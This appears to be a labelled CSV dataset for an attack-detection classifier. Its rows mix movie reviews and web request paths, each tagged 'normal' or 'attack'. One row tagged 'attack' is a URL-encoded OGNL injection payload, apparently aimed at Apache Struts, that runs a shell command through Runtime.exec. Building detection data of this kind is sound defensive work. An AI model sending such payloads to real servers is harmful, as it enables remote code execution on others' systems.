post,tags
"One of the most pleasurable aspects of movie viewing is to get lost in a film. To have it totally wash over you, so that you absorb it as it is, and thus, experience it to the fullest. Every time I see it, 'The Egyptian' is such a film. Over the years it is a picture critics have loved to hate. Many have thrown darts at its vulnerabilities. But perhaps it is because of the very tone the film brings with it rather than its most obvious characteristics. It is at once forbidding, remote, possibly dangerous; beware of what lies within! The haunting chords of the music, seen over the 20th-Fox logo, usher us into titles of other-worldly turquoise lettering.<br /><br />Strange! Archaeological! Decadent! It is as if we are descending into some vault of antiquity, wherein might be great treasures, mixed with uncertain hazards. (One might imagine Darryl Zanuck commanding: 'Make it ancient!') Then, what a darkly dramatic story unfolds, all within the same tone set at the start.<br /><br />Of Hollywood's mid-50s 'Egyptian Trilogy', 'The Ten Commandments' portrayed the civilization's sternness, the phenomenal 'Land of the Pharaohs' its nuts and bolts, while 'The Egyptian' shows it all, from glamour to tragedy, for us to wonder at.<br /><br />No need to say much about the players here, but I think that, with the passage of time, Bella Darvi is being redeemed. What a perfect face for the role, right out of a Symbolist painting. If her acting does not please some, it might be argued that, in her role as a 'courtesan', she is obviously better in bed than yakking to some poor helpless admirer. I think that Curtiz captured the kinkiness of her sado-masochistic relationship with Edmund Purdom's character with aplomb, censorship being what it was at the time. Sir Peter Ustinov, in his memoirs, was pretty kind to 'The Egyptian', writing that it was 'like being lost in a huge set for 'Aida'. His pronunciation of the word 'beer' I have adopted myself ever after.(One of the film's historically accurate references: the Egyptian's invented beer!) Henry Daniell, egads, what a perfect performance. Gene Tierney, what a screen treasure. Bless DFZ for giving her this 'late' role. C'mon folks, don't be so hard on Victor Mature! He's a cheesemaker's son! Who rose to be pharaoh! Sounds like a peculiarly American opportunity. One of the best moments: John Carradine's existential observations on the sands of time. And Purdom's utterance about dwelling beyond the sunset of the world. If that isn't Grade 'A' epicness, what is?<br /><br />Of course, along with everything else, the music is sublime. It is frequently noted that Alfred Newman and Bernard Herrmann created one of the screen's most compelling scores, perfectly harmonious, yet each theme is well developed, with a life of its own. Newman, pressed for time by DFZ, called in Herrmann, someone he could trust implicitly, to take up half the burden.<br /><br />Benny, not the easiest guy to work with, obviously respected Newman enough to really deliver inspiring music. They alternated cues, an ingenious approach. No spoilers as to who did what here, but Benny brings an edge with him, mysterious, awesome sounds. Alfred brings fulsomeness, longing, poignancy. Both are consummately epic. Even when seen on a squeezed TV print, the effect of seeing the two composers' names side by side in the main credits, which the ultra-wide anamorphic screen could comfortably accommodate, is spine-tingling.<br /><br />Leon Shamroy, the Dean of CinemaScope, does not let us down here. The lurid greens and moody shadows (probably distortions in all the terrible TV prints I've seen through the years) perfectly accompany the multi-dimensional script (by the great Philip Dunne and WB vet Casey Robinson, whom Curtiz must've brought with him to 20th). How remarkable it is that Shamroy, who was as much of an institution of cinematography at Fox as Newman was with music, would lens 'Cleopatra' a few years later, but in the brighter, sharper images of '60s Todd A-O. These old studio guys are really heroes of mine.<br /><br />To me, who wants to fret about all the imperfections and criticism opportunities in a picture like this? I'd rather yield entirely to its spell, and dive off into its sea of lavishness, to emerge after the inspiring climax of 'The End' refreshed, moved, and hungry for more.<br /><br />And yes, we should cry out to 20th-Fox for a DVD release worthy of DFZ's legacy.",normal
/wordpress/,normal
/mt/blog/author/gamzatti/2017/07/,normal
"/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=pwd",attack
/pmamy2/index.php,normal
/mt/mt-static/themes-base/blog.css,normal
/mt/know-how/styles.css,normal
"Not every movie with lesbian chicks and vampires, touching our favorite trash/cult genre is nice. Unfortunately this movie lucks of originality and the performances do not come up with the trash standards. Seem the creator's intention to make it cult it failed. Trash movies are trash movies because it happens. You cant create in purpose this kind of films.I don't know if Mr Creepo is a legend (first time i heard his name) BUT if he is i wonder the reason...<br /><br />Awful. Even the lesbian scenes are pathetic so any fans of erotic x-ploitation films will not be satisfied, as there a thousands of movies better than Barely Legal Lesbian Vampires.",normal
"Obviously, this is not the ""Piranha"" directed by Joe Dante and produced by Roger Corman. It wasn't so obvious, when I bought the DVD for only $2.95, as the DVD cover art matched that of the Corman produced comedy/horror ""Piranha"", even the DVD menu (no features of course) matched the cover. Half way through watching this odd movie, my girlfriend and I started thinking, where are the PIRANHAS? Once the movie reached the climax we realised that we must have been watching the wrong movie as we had seen the trailer, which had completely different footage, the blurb on the back of the DVD did not match the story we were watching and the credits (actors, producer, director) were also completely different. Instead, we got some jungle melodrama about a a girl and two guys who go searching for diamonds and end up confronting a vicious animal hunter. This tame, exploitation thriller is boring and pointless and is only mildly amusing for old-school, camp value. Strange that a DVD can be manufactured with the wrong film in tact, but I suppose it is an easy mistake to make seeing as though they are both B-grade movies of the same name made in the 70's. Reading other posts made on this film, I noticed that I'm not the only one with the wrong movie on the DVD. How could this be an INTERNATIONAL error? Is there perhaps, some sort of DVD phenomena where unsuccessful films try to get recognition by being put on the wrong DVDs? WHAT IS GOING ON???",normal
/pmamy2/index.php,normal
"Sorte Nula is the #1 Box Office Portuguese movie of 2004. This extreme low budget production (estimated USD$150,000) opened during Christmas opposite American Blockbusters like National Treasure, Polar Express, The Incredibles and Alexander but rapidly caught the adulation of the Portuguese moviegoers. Despite the harsh competition, the small film did surprisingly well, topping all other Portuguese films of the past two years in its first weeks. The film is a mystery/murder with a humorous tone cleverly written and directed by Fernando Fragata who has become a solid reference in the European independent film arena. Did I like the film? Oh, yes!",normal
